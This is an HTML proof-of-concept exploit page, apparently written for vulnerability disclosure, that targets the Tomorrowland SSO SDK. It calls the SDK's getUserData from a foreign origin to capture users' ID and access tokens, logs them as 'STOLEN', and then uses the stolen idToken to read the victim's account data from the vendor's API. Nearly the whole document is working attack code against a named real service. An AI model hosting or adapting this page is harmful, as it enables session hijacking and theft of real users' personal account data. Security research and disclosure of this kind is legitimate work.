<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="referrer" content="unsafe-url">
<title>TML SSO origin-check bypass PoC</title>
<style>
  body{font:14px/1.5 monospace;padding:24px;background:#111;color:#0f0}
  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:12px;border:1px solid #0f0}
  h1{color:#fff}
  .ok{color:#0f0}.bad{color:#f55}.warn{color:#fd0}
  #st{font-size:18px}
</style>
</head>
<body>
<h1>Tomorrowland SSO — cross-origin token theft PoC</h1>
<p>Origem desta página: <b id="org"></b></p>
<p>Status: <b id="st" class="warn">carregando SDK...</b></p>
<h3>Resultado:</h3>
<pre id="out">(aguardando...)</pre>
<h3>Log de mensagens postMessage recebidas (diagnóstico):</h3>
<pre id="msglog">(nenhuma ainda)</pre>

<script src="https://login.tomorrowland.com/lib/tml-sso.iife.js"></script>
<script>
  const $ = id => document.getElementById(id);
  $('org').textContent = location.origin;
  const st = $('st'), out = $('out'), msglog = $('msglog');
  function log(el, txt){ el.textContent = (el.textContent === '(nenhuma ainda)' || el.textContent === '(aguardando...)' ? '' : el.textContent) + txt + '\n'; }

  // DIAGNÓSTICO: loga TODA mensagem que chegar nesta janela
  let msgCount = 0;
  window.addEventListener('message', (e) => {
    msgCount++;
    let d = e.data; try { d = JSON.stringify(e.data); } catch(_){}
    log(msglog, '#'+msgCount+' origin='+e.origin+' data='+String(d).slice(0,300));
  });

  if (!window.TmlSso || !TmlSso.getUserData) {
    st.textContent = 'SDK não carregou (TmlSso ausente)'; st.className='bad';
  } else {
    st.textContent = 'SDK ok — chamando getUserData()...'; st.className='warn';

    const timeout = new Promise((_, rej) => setTimeout(() => rej('TIMEOUT 20s — o iframe não respondeu (provável partição de storage / cookie de terceiro)'), 20000));

    Promise.race([ TmlSso.getUserData('https://login.tomorrowland.com'), timeout ])
      .then(async (data) => {
        const hasTokens = data && data.tokens && (data.tokens.idToken || data.tokens.accessToken);
        if (hasTokens) {
          st.textContent = '🔓 TOKENS CAPTURADOS de outra origem!'; st.className='ok';
        } else {
          st.textContent = '⚠️ getUserData respondeu, mas SEM tokens (sessão não acessível no iframe)'; st.className='warn';
        }
        out.textContent = JSON.stringify(data, null, 2);
        console.log('STOLEN', data);

        const idToken = data && data.tokens && data.tokens.idToken;
        if (idToken) {
          try {
            const r = await fetch('https://api.tomorrowland.com/account', {
              headers: { 'x-auth-type': 'tomorrowland', 'Authorization': idToken }
            });
            out.textContent += '\n\n--- GET api.tomorrowland.com/account (com idToken roubado) ---\n' + (await r.text());
          } catch (e) { out.textContent += '\n\n(account fetch falhou: ' + e + ')'; }
        }
      })
      .catch((e) => { st.textContent = '❌ ' + e; st.className='bad'; out.textContent = String(e); console.log('POC-ERR', e); });
  }
</script>
</body>
</html>
